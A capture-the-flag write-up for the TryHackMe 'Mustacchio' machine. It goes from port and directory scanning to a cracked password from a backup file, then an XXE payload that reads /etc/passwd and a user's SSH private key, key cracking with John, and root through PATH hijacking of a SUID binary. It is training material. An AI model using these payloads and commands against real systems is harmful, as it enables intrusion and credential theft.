# Mustacchio

## 1. Introduction

### 1.1 Background

The Mustacchio machine from TryHackMe is an Easy-difficulty boot2root environment designed to assess skills in:

- Service enumeration
- Web analysis
- XML ​​vulnerability exploitation (XXE)
- Privilege escalation on Linux systems

The scenario presents multiple chained attack vectors, where the attacker must discover credentials, exploit a web vulnerability, and finally abuse insecure system configurations to gain root access.


### 1.2 Objectives

- Identify exposed services on the target machine
- Enumerate sensitive directories and files on the web server
- Obtain credentials by analyzing backups
- Exploit an XXE vulnerability to read system files
- Access via SSH using a private key
- Escalate privileges by abusing SUID binaries
- Obtain user and root flags

---

## 2. Enumeration

### 2.1 Nmap

An initial port scan was performed using Rustscan:

```bash
sudo nmap -p- -Pn -sS -n --min-rate 5000 <ip> -oN allports --open
```

### Results:

- 22/tcp → SSH
- 80/tcp → HTTP
- 8765/tcp → HTTP (administrative panel)

This indicates the presence of multiple web services and possible remote access via SSH.

### 2.2 Web

Service enumeration was initiated on port 80 using GoBuster:

```
gobuster dir -u http://<IP> -w /usr/share/dirb/wordlists/common.txt -x txt,php,sh,cgi,html,zip,bak,sql,old
```

#### Relevant Findings:

- Directory: `/custom/js/`
- File: `users.bak`

#### Analysis of users.bak

The following was used:

```
strings users.bak
```

### Result:

- User identified
- Password hash

The hash was cracked, yielding valid credentials.

### 2.3 Administrative Panel (Port 8765)

The panel is accessed using the obtained credentials:

- Successful login
- Functionality to insert comments

#### Additional Information (Source Code)

In the panel's source code:

- The user "barry" is mentioned
- Reference to the SSH key
- File: `/auth/dontforget.bak`

#### Analysis of dontforget.bak

The file contains the following XML structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
<name>Joe Hamd</name>
<author>Barry Clad</author>
<com>...</com>
</comment>
```

## 3. Exploitation

### 3.1 XXE (XML External Entity) Exploitation

The system is detected to process XML, so a vulnerability is tested XXE:

```
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<comment>
<name>Joe</name>
<author>Barry</author>
<com>&example;</com>
</com>
```

#### Result:

The system replaces the entity, confirming the XXE vulnerability.

#### Reading System Files

XXE is used to read `/etc/passwd`:

```
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'> ]>
```

#### Result:

- System users are obtained:

- barry

- joe

### 3.2 Extracting the SSH Key

Access:

```
/home/barry/.ssh/id_rsa
```

#### Result:

- The SSH private key is obtained
- The key is encrypted

#### Cracking the Key

```
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The passphrase is obtained.


### 3.3 SSH Access

```
ssh -i id_rsa barry@<IP>
```

- Successful access
- Obtaining `user.txt`

---

## 4. Post-Exploitation

### 4.1 Privilege Escalation using SUID + PATH Hijacking

SUID binaries are listed:

```
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

#### Key Finding:

```
/home/joe/live_log
```

#### Binary Analysis

```
strings live_log
```

#### Result:

```
tail -f /var/log/nginx/access.log
```

The binary executes `tail` with elevated privileges without using an absolute path.

### 4.2 Exploitation (PATH Hijacking)

1. Create a fake binary:

```
echo "/bin/bash" > /tmp/tail
chmod +x /tmp/tail
```

2. Modify PATH:

```
export PATH=/tmp:$PATH
```

3. Execute the binary:

```
/home/joe/live_log
```

### Final Result

```
id
```

```

uid=0(root)
```

Root access granted.
